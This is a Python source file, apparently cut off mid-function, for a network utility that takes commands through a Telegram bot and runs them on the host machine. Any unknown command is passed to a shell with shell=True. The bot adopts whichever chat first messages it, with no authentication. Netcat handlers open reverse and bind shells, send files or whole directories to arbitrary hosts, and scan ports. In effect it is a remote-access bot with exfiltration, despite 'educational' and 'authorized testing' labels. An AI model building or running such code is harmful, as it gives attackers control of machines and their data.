    """Command executor with 300+ commands and netcat support"""
    
    def __init__(self, db_manager: DatabaseManager = None):
        self.db = db_manager
        self.netcat = NetcatClient()
        
        # Setup command map
        self.command_map = self._setup_command_map()
        
        # Command categories for help (updated with netcat)
        self.categories = {
            'ping': 'Network ping commands',
            'scan': 'Port scanning and reconnaissance',
            'traceroute': 'Network path tracing',
            'web': 'Web and HTTP tools',
            'ssh': 'SSH connections and tunneling',
            'traffic': 'Network traffic generation and testing',
            'info': 'DNS, WHOIS, and information gathering',
            'system': 'System monitoring and information',
            'transfer': 'File transfer commands',
            'security': 'Security testing tools',
            'misc': 'Miscellaneous utilities',
            'netcat': 'Netcat networking utility'
        }
    
    def _setup_command_map(self) -> Dict[str, callable]:
        """Setup command execution map with netcat commands"""
        return {
            # Netcat commands
            'nc': self._execute_nc,
            'ncat': self._execute_nc,
            'netcat': self._execute_nc,
            
            # Netcat specific operations
            'nc_connect': self._execute_nc_connect,
            'nc_listen': self._execute_nc_listen,
            'nc_scan': self._execute_nc_scan,
            'nc_send': self._execute_nc_send,
            'nc_receive': self._execute_nc_receive,
            'nc_shell': self._execute_nc_shell,
            'nc_proxy': self._execute_nc_proxy,
            
            # Existing commands (simplified for example)
            'ping': self._execute_ping,
            'scan': self._execute_scan,
            'traceroute': self._execute_traceroute,
            'curl': self._execute_curl,
            'ssh': self._execute_ssh,
            'whois': self._execute_whois,
            'system': self._execute_system,
            'status': self._execute_status,
            'nmap': self._execute_generic,
        }
    
    def execute(self, command: str, source: str = "local") -> Dict[str, Any]:
        """Execute command and return results"""
        start_time = time.time()
        
        # Parse command
        parts = command.strip().split()
        if not parts:
            return self._create_result(False, "Empty command")
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        # Log command
        if self.db:
            self.db.log_command(command, source, True)
        
        # Execute command
        try:
            if cmd_name in self.command_map:
                result = self.command_map[cmd_name](args)
            else:
                # Try as generic shell command
                result = self._execute_generic(command)
            
            execution_time = time.time() - start_time
            
            # Update command log with execution time
            if self.db:
                self.db.log_command(command, source, result.get('success', False), 
                                  result.get('output', '')[:5000], execution_time)
            
            result['execution_time'] = execution_time
            return result
        
        except Exception as e:
            execution_time = time.time() - start_time
            error_msg = f"Error executing command: {e}"
            
            if self.db:
                self.db.log_command(command, source, False, error_msg, execution_time)
            
            return self._create_result(False, error_msg, execution_time)
    
    def get_help(self, category: str = None) -> Dict[str, Any]:
        """Get help for commands"""
        if category:
            if category.lower() == 'all':
                # Get all commands by category
                help_text = {}
                for cat_name, cat_desc in self.categories.items():
                    templates = self.db.get_command_templates(cat_name) if self.db else []
                    help_text[cat_name] = {
                        'description': cat_desc,
                        'commands': [t['usage'] for t in templates[:10]]  # First 10
                    }
                return self._create_result(True, help_text)
            else:
                # Get specific category
                templates = self.db.get_command_templates(category) if self.db else []
                if templates:
                    commands = [t['usage'] for t in templates]
                    return self._create_result(True, {
                        'category': category,
                        'description': self.categories.get(category, 'Unknown category'),
                        'commands': commands
                    })
                else:
                    return self._create_result(False, f"No commands found for category: {category}")
        else:
            # Show available categories
            return self._create_result(True, {
                'categories': self.categories,
                'total_commands': sum(len(self.db.get_command_templates(cat)) if self.db else 0 
                                     for cat in self.categories)
            })
    
    def _create_result(self, success: bool, data: Any, 
                      execution_time: float = 0.0) -> Dict[str, Any]:
        """Create standardized result dictionary"""
        if isinstance(data, str):
            return {
                'success': success,
                'output': data,
                'execution_time': execution_time
            }
        else:
            return {
                'success': success,
                'data': data,
                'execution_time': execution_time
            }
    
    # ==================== NETCAT COMMAND HANDLERS ====================
    
    def _execute_nc(self, args: List[str]) -> Dict[str, Any]:
        """Execute netcat command"""
        if not args:
            return self._create_result(False, "Usage: nc [options] <host> <port>")
        
        command = ' '.join(args)
        result = self.netcat.raw_nc_command(command)
        
        # Log netcat operation
        if self.db and 'host' in str(result):
            self.db.log_netcat_operation(
                operation_type="raw_nc",
                options=command,
                success=result.get('success', False),
                duration=result.get('execution_time', 0)
            )
        
        return self._create_result(result.get('success', False), result)
    
    def _execute_nc_connect(self, args: List[str]) -> Dict[str, Any]:
        """Execute netcat connect with various options"""
        if len(args) < 2:
            return self._create_result(False, "Usage: nc_connect <host> <port> [options]")
        
        host = args[0]
        try:
            port = int(args[1])
        except ValueError:
            return self._create_result(False, "Invalid port number")
        
        # Parse options
        verbose = 0
        no_dns = False
        use_udp = False
        ipv4 = False
        ipv6 = False
        
        for i in range(2, len(args)):
            opt = args[i]
            if opt == '-v':
                verbose = 1
            elif opt == '-vv':
                verbose = 2
            elif opt == '-n':
                no_dns = True
            elif opt == '-u':
                use_udp = True
            elif opt == '-4':
                ipv4 = True
            elif opt == '-6':
                ipv6 = True
        
        result = self.netcat.nc_connect(
            host, port, verbose, no_dns, 
            use_tcp=not use_udp, use_udp=use_udp,
            ipv4=ipv4, ipv6=ipv6
        )
        
        # Log operation
        if self.db:
            self.db.log_netcat_operation(
                operation_type="connect",
                host=host,
                port=port,
                options=f"verbose={verbose}, udp={use_udp}",
                success=result.get('success', False),
                duration=result.get('execution_time', 0)
            )
        
        return self._create_result(result.get('success', False), result)
    
    def _execute_nc_listen(self, args: List[str]) -> Dict[str, Any]:
        """Execute netcat listen"""
        if len(args) < 1:
            return self._create_result(False, "Usage: nc_listen <port> [options]")
        
        try:
            port = int(args[0])
        except ValueError:
            return self._create_result(False, "Invalid port number")
        
        # Parse options
        verbose = 0
        keepalive = False
        bind_ip = None
        
        for i in range(1, len(args)):
            opt = args[i]
            if opt == '-v':
                verbose = 1
            elif opt == '-vv':
                verbose = 2
            elif opt == '-k':
                keepalive = True
            elif opt == '-l' and i + 1 < len(args):
                bind_ip = args[i + 1]
        
        result = self.netcat.nc_listen(port, verbose, keepalive, bind_ip)
        
        # Log operation
        if self.db:
            self.db.log_netcat_operation(
                operation_type="listen",
                port=port,
                options=f"verbose={verbose}, keepalive={keepalive}",
                success=result.get('success', False),
                duration=result.get('execution_time', 0)
            )
        
        return self._create_result(result.get('success', False), result)
    
    def _execute_nc_scan(self, args: List[str]) -> Dict[str, Any]:
        """Execute netcat port scan"""
        if len(args) < 2:
            return self._create_result(False, "Usage: nc_scan <host> <port|range> [options]")
        
        host = args[0]
        port_arg = args[1]
        
        # Parse options
        verbose = 0
        fast = False
        no_dns = False
        
        for i in range(2, len(args)):
            opt = args[i]
            if opt == '-v':
                verbose = 1
            elif opt == '-vv':
                verbose = 2
            elif opt == '-n':
                no_dns = True
            elif opt == '-z':
                fast = True
        
        # Check if it's a range
        if '-' in port_arg:
            result = self.netcat.nc_scan_range(host, port_arg, verbose, no_dns)
        else:
            try:
                port = int(port_arg)
                result = self.netcat.nc_scan_port(host, port, verbose, fast, no_dns)
            except ValueError:
                return self._create_result(False, "Invalid port or range")
        
        # Log operation
        if self.db:
            self.db.log_netcat_operation(
                operation_type="scan",
                host=host,
                options=f"target={port_arg}, verbose={verbose}",
                success=result.get('success', False),
                duration=result.get('execution_time', 0)
            )
        
        return self._create_result(result.get('success', False), result)
    
    def _execute_nc_send(self, args: List[str]) -> Dict[str, Any]:
        """Execute netcat send operations"""
        if len(args) < 3:
            return self._create_result(False, "Usage: nc_send <type> <host> <port> <data>")
        
        send_type = args[0].lower()
        host = args[1]
        
        try:
            port = int(args[2])
        except ValueError:
            return self._create_result(False, "Invalid port number")
        
        if send_type == 'file':
            if len(args) < 4:
                return self._create_result(False, "Usage: nc_send file <host> <port> <filename>")
            filename = args[3]
            result = self.netcat.nc_send_file(host, port, filename)
        
        elif send_type == 'text':
            if len(args) < 4:
                return self._create_result(False, "Usage: nc_send text <host> <port> <text>")
            text = ' '.join(args[3:])
            result = self.netcat.nc_send_text(host, port, text)
        
        elif send_type == 'directory':
            if len(args) < 4:
                return self._create_result(False, "Usage: nc_send directory <host> <port> <folder>")
            folder = args[3]
            result = self.netcat.nc_send_directory(host, port, folder)
        
        else:
            return self._create_result(False, "Unknown send type. Use: file, text, or directory")
        
        # Log operation
        if self.db:
            self.db.log_netcat_operation(
                operation_type=f"send_{send_type}",
                host=host,
                port=port,
                options=f"type={send_type}",
                success=result.get('success', False),
                bytes_transferred=result.get('bytes_sent', 0),
                duration=result.get('execution_time', 0)
            )
        
        return self._create_result(result.get('success', False), result)
    
    def _execute_nc_receive(self, args: List[str]) -> Dict[str, Any]:
        """Execute netcat receive operations"""
        if len(args) < 2:
            return self._create_result(False, "Usage: nc_receive <type> <port> [filename]")
        
        receive_type = args[0].lower()
        
        try:
            port = int(args[1])
        except ValueError:
            return self._create_result(False, "Invalid port number")
        
        if receive_type == 'file':
            if len(args) < 3:
                return self._create_result(False, "Usage: nc_receive file <port> <filename>")
            filename = args[2]
            result = self.netcat.nc_receive_file(port, filename)
        
        elif receive_type == 'directory':
            result = self.netcat.nc_receive_directory(port)
        
        else:
            return self._create_result(False, "Unknown receive type. Use: file or directory")
        
        # Log operation
        if self.db:
            self.db.log_netcat_operation(
                operation_type=f"receive_{receive_type}",
                port=port,
                options=f"type={receive_type}",
                success=result.get('success', False),
                bytes_transferred=result.get('file_size', 0),
                duration=result.get('execution_time', 0)
            )
        
        return self._create_result(result.get('success', False), result)
    
    def _execute_nc_shell(self, args: List[str]) -> Dict[str, Any]:
        """Execute netcat shell operations"""
        if len(args) < 3:
            return self._create_result(False, "Usage: nc_shell <type> <host> <port>")
        
        shell_type = args[0].lower()
        host = args[1]
        
        try:
            port = int(args[2])
        except ValueError:
            return self._create_result(False, "Invalid port number")
        
        if shell_type == 'reverse':
            if len(args) < 4:
                return self._create_result(False, "Usage: nc_shell reverse <host> <port> <shell_type>")
            shell = args[3]  # sh, bash, windows
            result = self.netcat.nc_reverse_shell(host, port, shell)
        
        elif shell_type == 'bind':
            if len(args) < 4:
                return self._create_result(False, "Usage: nc_shell bind <port> <shell_type>")
            shell = args[3]
            result = self.netcat.nc_bind_shell(port, shell)
        
        else:
            return self._create_result(False, "Unknown shell type. Use: reverse or bind")
        
        # Log operation (carefully - shell operations are sensitive)
        if self.db:
            self.db.log_netcat_operation(
                operation_type=f"shell_{shell_type}",
                host=host if shell_type == 'reverse' else None,
                port=port,
                options=f"type={shell_type}, shell={args[3] if len(args) > 3 else 'unknown'}",
                success=result.get('success', False),
                duration=result.get('execution_time', 0)
            )
        
        return self._create_result(result.get('success', False), result)
    
    def _execute_nc_proxy(self, args: List[str]) -> Dict[str, Any]:
        """Execute netcat proxy operations"""
        if len(args) < 3:
            return self._create_result(False, "Usage: nc_proxy <proxy> <host> <port> [type]")
        
        proxy = args[0]
        host = args[1]
        
        try:
            port = int(args[2])
        except ValueError:
            return self._create_result(False, "Invalid port number")
        
        proxy_type = "connect"
        if len(args) > 3:
            proxy_type = args[3].lower()
        
        result = self.netcat.nc_proxy(host, port, proxy, proxy_type)
        
        # Log operation
        if self.db:
            self.db.log_netcat_operation(
                operation_type="proxy",
                host=host,
                port=port,
                options=f"proxy={proxy}, type={proxy_type}",
                success=result.get('success', False),
                duration=result.get('execution_time', 0)
            )
        
        return self._create_result(result.get('success', False), result)
    
    # ==================== EXISTING COMMAND HANDLERS ====================
    
    def _execute_ping(self, args: List[str]) -> Dict[str, Any]:
        """Execute ping command"""
        if not args:
            return self._create_result(False, "Usage: ping <target>")
        
        return self._execute_generic('ping ' + ' '.join(args))
    
    def _execute_scan(self, args: List[str]) -> Dict[str, Any]:
        """Execute scan command"""
        if not args:
            return self._create_result(False, "Usage: scan <target>")
        
        return self._execute_generic('nmap ' + ' '.join(args))
    
    def _execute_traceroute(self, args: List[str]) -> Dict[str, Any]:
        """Execute traceroute"""
        if not args:
            return self._create_result(False, "Usage: traceroute <target>")
        
        return self._execute_generic('traceroute ' + ' '.join(args))
    
    def _execute_curl(self, args: List[str]) -> Dict[str, Any]:
        """Execute curl command"""
        if not args:
            return self._create_result(False, "Usage: curl <url>")
        
        return self._execute_generic('curl ' + ' '.join(args))
    
    def _execute_ssh(self, args: List[str]) -> Dict[str, Any]:
        """Execute SSH command"""
        if not args:
            return self._create_result(False, "Usage: ssh <host>")
        
        return self._execute_generic('ssh ' + ' '.join(args))
    
    def _execute_whois(self, args: List[str]) -> Dict[str, Any]:
        """Execute whois command"""
        if not args:
            return self._create_result(False, "Usage: whois <domain>")
        
        return self._execute_generic('whois ' + ' '.join(args))
    
    def _execute_system(self, args: List[str]) -> Dict[str, Any]:
        """Get system information"""
        info = {
            'system': platform.system(),
            'release': platform.release(),
            'version': platform.version(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'python_version': platform.python_version(),
            'cpu_count': psutil.cpu_count(),
            'cpu_percent': psutil.cpu_percent(interval=1),
            'memory': {
                'total': psutil.virtual_memory().total,
                'available': psutil.virtual_memory().available,
                'percent': psutil.virtual_memory().percent,
                'used': psutil.virtual_memory().used,
                'free': psutil.virtual_memory().free
            },
            'disk': {
                'total': psutil.disk_usage('/').total,
                'used': psutil.disk_usage('/').used,
                'free': psutil.disk_usage('/').free,
                'percent': psutil.disk_usage('/').percent
            },
            'boot_time': datetime.datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S'),
            'users': [u.name for u in psutil.users()]
        }
        
        return self._create_result(True, info)
    
    def _execute_status(self, args: List[str]) -> Dict[str, Any]:
        """Get system status"""
        status = {
            'timestamp': datetime.datetime.now().isoformat(),
            'cpu': f"{psutil.cpu_percent(interval=1)}%",
            'memory': f"{psutil.virtual_memory().percent}%",
            'disk': f"{psutil.disk_usage('/').percent}%",
            'uptime': str(datetime.datetime.now() - datetime.datetime.fromtimestamp(psutil.boot_time())),
            'network': {
                'bytes_sent': psutil.net_io_counters().bytes_sent,
                'bytes_recv': psutil.net_io_counters().bytes_recv,
                'packets_sent': psutil.net_io_counters().packets_sent,
                'packets_recv': psutil.net_io_counters().packets_recv
            }
        }
        
        return self._create_result(True, status)
    
    def _execute_generic(self, command: str) -> Dict[str, Any]:
        """Execute generic shell command"""
        try:
            start_time = time.time()
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60,
                encoding='utf-8',
                errors='ignore'
            )
            execution_time = time.time() - start_time
            
            return self._create_result(
                result.returncode == 0,
                result.stdout if result.stdout else result.stderr,
                execution_time
            )
        
        except subprocess.TimeoutExpired:
            return self._create_result(False, f"Command timed out after 60 seconds")
        
        except Exception as e:
            return self._create_result(False, f"Command execution failed: {e}")

# ============================================================================
# TELEGRAM BOT HANDLER (ENHANCED WITH NETCAT)
# ============================================================================

class TelegramBotHandler:
    """Telegram bot handler with all commands including netcat support"""
    
    def __init__(self, db_manager: DatabaseManager, executor: CommandExecutor):
        self.db = db_manager
        self.executor = executor
        self.netcat = NetcatClient()
        self.config = ConfigManager.load_telegram_config()
        self.token = self.config.get('token', '')
        self.chat_id = self.config.get('chat_id', '')
        self.enabled = self.config.get('enabled', False)
        self.last_update_id = 0
        
        # Setup command handlers
        self.command_handlers = self._setup_command_handlers()
    
    def _setup_command_handlers(self) -> Dict[str, callable]:
        """Setup Telegram command handlers with netcat commands"""
        handlers = {
            # Netcat commands
            '/nc_connect': self._handle_nc_connect,
            '/nc_listen': self._handle_nc_listen,
            '/nc_scan': self._handle_nc_scan,
            '/nc_send': self._handle_nc_send,
            '/nc_receive': self._handle_nc_receive,
            '/nc_shell': self._handle_nc_shell,
            '/nc_proxy': self._handle_nc_proxy,
            '/nc_help': self._handle_nc_help,
            
            # Existing commands
            '/start': self._handle_start,
            '/help': self._handle_help,
            '/ping': self._handle_ping,
            '/scan': self._handle_scan,
            '/traceroute': self._handle_traceroute,
            '/nmap': self._handle_nmap,
            '/curl': self._handle_curl,
            '/ssh': self._handle_ssh,
            '/whois': self._handle_whois,
            '/dns': self._handle_dns,
            '/location': self._handle_location,
            '/analyze': self._handle_analyze,
            '/system': self._handle_system,
            '/network': self._handle_network,
            '/status': self._handle_status,
            '/history': self._handle_history,
            '/threats': self._handle_threats,
            '/report': self._handle_report,
            '/monitor': self._handle_monitor,
            '/config': self._handle_config,
            '/test': self._handle_test,
            '/commands': self._handle_commands,
        }
        return handlers
    
    def send_message(self, message: str, parse_mode: str = 'HTML', 
                    disable_preview: bool = True) -> bool:
        """Send message to Telegram"""
        if not self.token or not self.chat_id or not self.enabled:
            logger.warning("Telegram not configured or disabled")
            return False
        
        try:
            url = f"https://api.telegram.org/bot{self.token}/sendMessage"
            
            # Split long messages
            if len(message) > 4096:
                chunks = self._split_message(message)
                for chunk in chunks:
                    payload = {
                        'chat_id': self.chat_id,
                        'text': chunk,
                        'parse_mode': parse_mode,
                        'disable_web_page_preview': disable_preview
                    }
                    response = requests.post(url, json=payload, timeout=10)
                    if response.status_code != 200:
                        logger.error(f"Failed to send Telegram message chunk: {response.status_code}")
                        return False
                    time.sleep(0.3)
                return True
            else:
                payload = {
                    'chat_id': self.chat_id,
                    'text': message,
                    'parse_mode': parse_mode,
                    'disable_web_page_preview': disable_preview
                }
                response = requests.post(url, json=payload, timeout=10)
                success = response.status_code == 200
                if not success:
                    logger.error(f"Telegram API error: {response.status_code} - {response.text}")
                return success
        
        except Exception as e:
            logger.error(f"Telegram send error: {e}")
            return False
    
    def _split_message(self, message: str, max_length: int = 4000) -> List[str]:
        """Split long message into chunks"""
        chunks = []
        current_chunk = ""
        
        lines = message.split('\n')
        
        for line in lines:
            if len(current_chunk) + len(line) + 1 > max_length:
                if current_chunk:
                    chunks.append(current_chunk)
                    current_chunk = line
                else:
                    words = line.split()
                    for word in words:
                        if len(current_chunk) + len(word) + 1 > max_length:
                            chunks.append(current_chunk)
                            current_chunk = word
                        else:
                            current_chunk += " " + word if current_chunk else word
            else:
                current_chunk += "\n" + line if current_chunk else line
        
        if current_chunk:
            chunks.append(current_chunk)
        
        return chunks
    
    def get_updates(self) -> List[Dict]:
        """Get updates from Telegram"""
        if not self.token:
            return []
        
        try:
            url = f"https://api.telegram.org/bot{self.token}/getUpdates"
            params = {
                'offset': self.last_update_id + 1,
                'timeout': 10,
                'allowed_updates': ['message']
            }
            response = requests.get(url, params=params, timeout=15)
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok'):
                    return data.get('result', [])
        
        except Exception as e:
            logger.error(f"Telegram getUpdates error: {e}")
        
        return []
    
    def process_updates(self):
        """Process incoming Telegram updates"""
        updates = self.get_updates()
        
        for update in updates:
            self.last_update_id = update['update_id']
            
            if 'message' in update and 'text' in update['message']:
                self.process_message(update['message'])
    
    def process_message(self, message: Dict):
        """Process individual message"""
        text = message.get('text', '').strip()
        chat_id = message.get('chat', {}).get('id')
        
        if not text:
            return
        
        # Set chat ID if not set
        if not self.chat_id and chat_id:
            self.chat_id = str(chat_id)
            self.enabled = True
            ConfigManager.save_telegram_config(self.token, self.chat_id, self.enabled)
            logger.info(f"Telegram chat ID set: {self.chat_id}")
        
        # Process command
        if text.startswith('/'):
            self._process_command(text, chat_id)
        else:
            self.send_message(f"💬 You said: {text}")
    
    def _process_command(self, command: str, chat_id: str):
        """Process command"""
        parts = command.split()
        cmd = parts[0].lower()
        args = parts[1:] if len(parts) > 1 else []
        
        # Log command
        if self.db:
            self.db.log_command(command, 'telegram', True)
        
        # Execute command
        if cmd in self.command_handlers:
            try:
                response = self.command_handlers[cmd](args)
                self.send_message(response)
            except Exception as e:
                error_msg = f"❌ Error executing command: {str(e)}"
                self.send_message(error_msg)
                logger.error(f"Command error: {e}")
        else:
            result = self.executor.execute(command[1:], 'telegram')
            if result['success']:
                output = result.get('output', '') or result.get('data', '')
                if isinstance(output, dict):
                    output = json.dumps(output, indent=2)
                
                response = f"✅ Command executed ({result['execution_time']:.2f}s)\n\n"
                response += f"<code>{output[:3500]}</code>"
                if len(str(output)) > 3500:
                    response += "\n\n... (output truncated)"
                
                self.send_message(response)
            else:
                error_msg = f"❌ Command failed: {result.get('output', 'Unknown error')}"
                self.send_message(error_msg)
    
    def test_connection(self) -> Tuple[bool, str]:
        """Test Telegram connection"""
        if not self.token:
            return False, "Token not configured"
        
        try:
            url = f"https://api.telegram.org/bot{self.token}/getMe"
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok'):
                    bot_info = data.get('result', {})
                    return True, f"Connected as @{bot_info.get('username', 'Unknown')}"
                else:
                    return False, f"API error: {data.get('description')}"
            else:
                return False, f"HTTP error: {response.status_code}"
        
        except Exception as e:
            return False, f"Connection error: {str(e)}"
    
    # ==================== NETCAT COMMAND HANDLERS ====================
    
    def _handle_nc_connect(self, args: List[str]) -> str:
        """Handle /nc_connect command"""
        if len(args) < 2:
            return "❌ Usage: <code>/nc_connect &lt;host&gt; &lt;port&gt; [options]</code>\nOptions: -v (verbose), -vv (very verbose), -n (no DNS), -u (UDP), -4 (IPv4), -6 (IPv6)"
        
        host = args[0]
        try:
            port = int(args[1])
        except ValueError:
            return "❌ Invalid port number"
        
        # Parse options
        verbose = 0
        no_dns = False
        use_udp = False
        ipv4 = False
        ipv6 = False
        
        for i in range(2, len(args)):
            opt = args[i]
            if opt == '-v':
                verbose = 1
            elif opt == '-vv':
                verbose = 2
            elif opt == '-n':
                no_dns = True
            elif opt == '-u':
                use_udp = True
            elif opt == '-4':
                ipv4 = True
            elif opt == '-6':
                ipv6 = True
        
        result = self.netcat.nc_connect(host, port, verbose, no_dns, 
                                      use_tcp=not use_udp, use_udp=use_udp,
                                      ipv4=ipv4, ipv6=ipv6)
        
        if result['success']:
            response = f"✅ <b>Netcat Connection Successful</b>\n\n"
            response += f"Host: <code>{host}:{port}</code>\n"
            if verbose > 0:
                response += f"Verbosity: Level {verbose}\n"
            if no_dns:
                response += "DNS Resolution: Disabled\n"
            if use_udp:
                response += "Protocol: UDP\n"
            else:
                response += "Protocol: TCP\n"
            if ipv4:
                response += "IP Version: IPv4\n"
            elif ipv6:
                response += "IP Version: IPv6\n"
            
            if result.get('output'):
                output = result['output'][:1000]
                response += f"\n<code>{output}</code>"
                if len(result['output']) > 1000:
                    response += "\n\n... (output truncated)"
        else:
            response = f"❌ <b>Netcat Connection Failed</b>\n\n"
            response += f"Error: {result.get('error', 'Unknown error')}\n"
            if result.get('output'):
                response += f"\n<code>{result['output'][:500]}</code>"
        
        return response
    
    def _handle_nc_listen(self, args: List[str]) -> str:
        """Handle /nc_listen command"""
        if len(args) < 1:
            return "❌ Usage: <code>/nc_listen &lt;port&gt; [options]</code>\nOptions: -v (verbose), -k (keepalive), -l &lt;ip&gt; (bind IP)"
        
        try:
            port = int(args[0])
        except ValueError:
            return "❌ Invalid port number"
        
        # Parse options
        verbose = 0
        keepalive = False
        bind_ip = None
        
        for i in range(1, len(args)):
            opt = args[i]
            if opt == '-v':
                verbose = 1
            elif opt == '-vv':
                verbose = 2
            elif opt == '-k':
                keepalive = True
            elif opt == '-l' and i + 1 < len(args):
                bind_ip = args[i + 1]
        
        result = self.netcat.nc_listen(port, verbose, keepalive, bind_ip)
        
        if result['success']:
            response = f"✅ <b>Netcat Listener Started</b>\n\n"
            response += f"Port: <code>{port}</code>\n"
            if bind_ip:
                response += f"Bind IP: <code>{bind_ip}</code>\n"
            if verbose > 0:
                response += f"Verbosity: Level {verbose}\n"
            if keepalive:
                response += "Keep-alive: Enabled\n"
            
            if result.get('output'):
                output = result['output'][:1000]
                response += f"\n<code>{output}</code>"
                if len(result['output']) > 1000:
                    response += "\n\n... (output truncated)"
        else:
            response = f"❌ <b>Netcat Listener Failed</b>\n\n"
            response += f"Error: {result.get('error', 'Unknown error')}\n"
            if result.get('output'):
                response += f"\n<code>{result['output'][:500]}</code>"
        
        return response
    
    def _handle_nc_scan(self, args: List[str]) -> str:
        """Handle /nc_scan command"""
        if len(args) < 2:
            return "❌ Usage: <code>/nc_scan &lt;host&gt; &lt;port|range&gt; [options]</code>\nOptions: -v (verbose), -n (no DNS)"
        
        host = args[0]
        port_arg = args[1]
        
        # Parse options
        verbose = 0
        fast = False
        no_dns = False
        
        for i in range(2, len(args)):
            opt = args[i]
            if opt == '-v':
                verbose = 1
            elif opt == '-vv':
                verbose = 2
            elif opt == '-n':
                no_dns = True
            elif opt == '-z':
                fast = True
        
        # Check if it's a range
        if '-' in port_arg:
            result = self.netcat.nc_scan_range(host, port_arg, verbose, no_dns)
        else:
            try:
                port = int(port_arg)
                result = self.netcat.nc_scan_port(host, port, verbose, fast, no_dns)
            except ValueError:
                return "❌ Invalid port or range"
        
        if result['success']:
            response = f"✅ <b>Netcat Port Scan Complete</b>\n\n"
            response += f"Target: <code>{host}</code>\n"
            response += f"Port(s): <code>{port_arg}</code>\n"
            if verbose > 0:
                response += f"Verbosity: Level {verbose}\n"
            if no_dns:
                response += "DNS Resolution: Disabled\n"
            if fast:
                response += "Mode: Fast scan\n"
            
            if result.get('output'):
                output = result['output'][:1000]
                response += f"\n<code>{output}</code>"
                if len(result['output']) > 1000:
                    response += "\n\n... (output truncated)"
        else:
            response = f"❌ <b>Netcat Port Scan Failed</b>\n\n"
            response += f"Error: {result.get('error', 'Unknown error')}\n"
            if result.get('output'):
                response += f"\n<code>{result['output'][:500]}</code>"
        
        return response
    
    def _handle_nc_send(self, args: List[str]) -> str:
        """Handle /nc_send command"""
        if len(args) < 3:
            return "❌ Usage: <code>/nc_send &lt;type&gt; &lt;host&gt; &lt;port&gt; &lt;data&gt;</code>\nTypes: file, text, directory"
        
        send_type = args[0].lower()
        host = args[1]
        
        try:
            port = int(args[2])
        except ValueError:
            return "❌ Invalid port number"
        
        if send_type == 'file':
            if len(args) < 4:
                return "❌ Usage: <code>/nc_send file &lt;host&gt; &lt;port&gt; &lt;filename&gt;</code>"
            filename = args[3]
            result = self.netcat.nc_send_file(host, port, filename)
            
            response = f"📁 <b>Netcat File Send</b>\n\n"
            if result['success']:
                response += f"✅ File sent successfully!\n"
                response += f"File: <code>{filename}</code>\n"
                response += f"Destination: <code>{host}:{port}</code>\n"
                response += f"Bytes sent: {result.get('bytes_sent', 0)}\n"
            else:
                response += f"❌ Failed to send file\n"
                response += f"Error: {result.get('error', 'Unknown error')}\n"
        
        elif send_type == 'text':
            if len(args) < 4:
                return "❌ Usage: <code>/nc_send text &lt;host&gt; &lt;port&gt; &lt;text&gt;</code>"
            text = ' '.join(args[3:])
            result = self.netcat.nc_send_text(host, port, text)
            
            response = f"📝 <b>Netcat Text Send</b>\n\n"
            if result['success']:
                response += f"✅ Text sent successfully!\n"
                response += f"Destination: <code>{host}:{port}</code>\n"
                response += f"Bytes sent: {result.get('bytes_sent', 0)}\n"
                response += f"\nContent: <code>{text[:100]}...</code>\n"
            else:
                response += f"❌ Failed to send text\n"
                response += f"Error: {result.get('error', 'Unknown error')}\n"
        
        elif send_type == 'directory':
            if len(args) < 4:
                return "❌ Usage: <code>/nc_send directory &lt;host&gt; &lt;port&gt; &lt;folder&gt;</code>"
            folder = args[3]
            result = self.netcat.nc_send_directory(host, port, folder)
            
            response = f"📂 <b>Netcat Directory Send</b>\n\n"
            if result['success']:
                response += f"✅ Directory sent successfully!\n"
                response += f"Folder: <code>{folder}</code>\n"
                response += f"Destination: <code>{host}:{port}</code>\n"
            else:
                response += f"❌ Failed to send directory\n"
                response += f"Error: {result.get('error', 'Unknown error')}\n"
        
        else:
            return "❌ Unknown send type. Use: file, text, or directory"
        
        return response
    
    def _handle_nc_receive(self, args: List[str]) -> str:
        """Handle /nc_receive command"""
        if len(args) < 2:
            return "❌ Usage: <code>/nc_receive &lt;type&gt; &lt;port&gt; [filename]</code>\nTypes: file, directory"
        
        receive_type = args[0].lower()
        
        try:
            port = int(args[1])
        except ValueError:
            return "❌ Invalid port number"
        
        if receive_type == 'file':
            if len(args) < 3:
                return "❌ Usage: <code>/nc_receive file &lt;port&gt; &lt;filename&gt;</code>"
            filename = args[2]
            result = self.netcat.nc_receive_file(port, filename)
            
            response = f"📁 <b>Netcat File Receive</b>\n\n"
            if result['success'] and result.get('file_received'):
                response += f"✅ File received successfully!\n"
                response += f"File: <code>{filename}</code>\n"
                response += f"Port: <code>{port}</code>\n"
                response += f"File size: {result.get('file_size', 0)} bytes\n"
            else:
                response += f"❌ Failed to receive file\n"
                response += f"Error: {result.get('error', 'Unknown error')}\n"
        
        elif receive_type == 'directory':
            result = self.netcat.nc_receive_directory(port)
            
            response = f"📂 <b>Netcat Directory Receive</b>\n\n"
            if result['success']:
                response += f"✅ Directory received successfully!\n"
                response += f"Port: <code>{port}</code>\n"
                response += f"Output directory: {result.get('output_directory', 'N/A')}\n"
                response += f"Files extracted: {result.get('files_extracted', 0)}\n"
            else:
                response += f"❌ Failed to receive directory\n"
                response += f"Error: {result.get('error', 'Unknown error')}\n"
        
        else:
            return "❌ Unknown receive type. Use: file or directory"
        
        return response
    
    def _handle_nc_shell(self, args: List[str]) -> str:
        """Handle /nc_shell command (for educational purposes only)"""
        if len(args) < 3:
            return "❌ Usage: <code>/nc_shell &lt;type&gt; &lt;host&gt; &lt;port&gt; [shell_type]</code>\nTypes: reverse, bind\nShell types: sh, bash, windows"
        
        shell_type = args[0].lower()
        host = args[1]
        
        try:
            port = int(args[2])
        except ValueError:
            return "❌ Invalid port number"
        
        if shell_type == 'reverse':
            if len(args) < 4:
                return "❌ Usage: <code>/nc_shell reverse &lt;host&gt; &lt;port&gt; &lt;shell_type&gt;</code>"
            shell = args[3]
            result = self.netcat.nc_reverse_shell(host, port, shell)
            
            response = f"🔙 <b>Netcat Reverse Shell</b>\n\n"
            if result['success']:
                response += f"⚠️ Reverse shell attempt made\n"
                response += f"Host: <code>{host}:{port}</code>\n"
                response += f"Shell type: {shell}\n"
                response += "⚠️ <i>Note: This is for authorized testing only</i>\n"
            else:
                response += f"❌ Reverse shell failed\n"
                response += f"Error: {result.get('error', 'Unknown error')}\n"
        
        elif shell_type == 'bind':
            if len(args) < 4:
